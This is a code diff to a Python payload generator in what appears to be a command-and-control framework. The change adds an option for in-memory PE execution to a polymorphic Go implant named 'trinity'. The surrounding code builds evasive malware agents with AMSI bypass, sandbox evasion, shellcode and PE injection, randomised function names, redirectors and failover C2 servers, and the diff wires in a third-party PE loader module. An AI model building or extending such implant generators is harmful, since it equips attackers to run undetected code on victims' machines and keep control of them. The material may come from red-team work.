@@ -97,7 +97,7 @@ class PayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
+    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
         print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")
 
         listener = self.db.get_listener(listener_id)
@@ -186,7 +186,7 @@ class PayloadGenerator:
             )
         elif payload_type == "trinity":
             return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
+                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers, include_bof=include_bof, include_assembly=include_assembly, include_pe=include_pe, include_execute_pe=include_execute_pe, include_shellcode=include_shellcode, include_reverse_proxy=include_reverse_proxy, include_sandbox=include_sandbox
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
@@ -456,7 +456,7 @@ class PayloadGenerator:
         return agent_template.strip()
 
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None, include_bof=True, include_assembly=True, include_pe=True, include_execute_pe=True, include_shellcode=True, include_reverse_proxy=True, include_sandbox=True):
         if failover_urls is None:
             failover_urls = []
         if profile_headers is None:
@@ -535,6 +535,7 @@ class PayloadGenerator:
         agent_get_process_id_func = poly.generate_random_name('getProcessId') if (include_shellcode or include_pe) else 'getProcessId_stub'
         agent_inject_shellcode_func = poly.generate_random_name('injectShellcode') if include_shellcode else 'injectShellcode_stub'
         agent_inject_pe_func = poly.generate_random_name('injectPE') if include_pe else 'injectPE_stub'
+        agent_execute_pe_func = poly.generate_random_name('executePE') if (include_pe and include_execute_pe) else 'executePE_stub'
 
         # Generate random names for reverse proxy fields (only if included)
         agent_reverse_proxy_active_field = poly.generate_go_field_name('ReverseProxyActive') if include_reverse_proxy else 'ReverseProxyActive_stub'
@@ -633,6 +634,9 @@ class PayloadGenerator:
 
                 if include_assembly:
                     import_lines.append('\t"github.com/Ne0nd0g/go-clr"')
+
+                if include_pe and include_execute_pe:
+                    import_lines.append('\t"github.com/praetorian-inc/goffloader/src/pe"')
 
                 import_lines.append(")")
                 import_lines.append("")  # Empty line after imports
@@ -817,6 +821,42 @@ class PayloadGenerator:
                             filtered_lines.append(line)
 
                         go_code_parts.append('\n'.join(filtered_lines))
+
+            # Also include execute_pe module if PE and execute_pe are enabled
+            if include_execute_pe:
+                execute_pe_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'execute_pe')
+                if os.path.exists(execute_pe_dir):
+                    for filename in os.listdir(execute_pe_dir):
+                        if filename.endswith('.go'):
+                            with open(os.path.join(execute_pe_dir, filename), 'r') as f:
+                                content = f.read()
+                                # Remove any package declaration and import blocks from feature modules
+                                lines = content.split('\n')
+                                filtered_lines = []
+                                in_import_block = False
+
+                                for line in lines:
+                                    stripped = line.strip()
+
+                                    # Skip package declaration
+                                    if stripped.startswith('package '):
+                                        continue
+
+                                    # Skip import statements
+                                    if stripped.startswith('import '):
+                                        if '(' in stripped:  # import block start
+                                            in_import_block = True
+                                        continue
+
+                                    # Handle import block
+                                    if in_import_block:
+                                        if stripped == ')':  # end of import block
+                                            in_import_block = False
+                                        continue
+
+                                    filtered_lines.append(line)
+
+                                go_code_parts.append('\n'.join(filtered_lines))
 
         if include_reverse_proxy:
             reverse_proxy_dir = os.path.join(os.path.dirname(__file__), 'trinity_modules', 'reverse_proxy')
@@ -1006,6 +1046,7 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_GET_PROCESS_ID_FUNC}', agent_get_process_id_func)
         go_code = go_code.replace('{AGENT_INJECT_SHELLCODE_FUNC}', agent_inject_shellcode_func)
         go_code = go_code.replace('{AGENT_INJECT_PE_FUNC}', agent_inject_pe_func)
+        go_code = go_code.replace('{AGENT_EXECUTE_PE_FUNC}', agent_execute_pe_func)
 
         # Replace failover function names
         go_code = go_code.replace('{AGENT_TRY_FAILOVER_FUNC}', agent_try_failover_func)
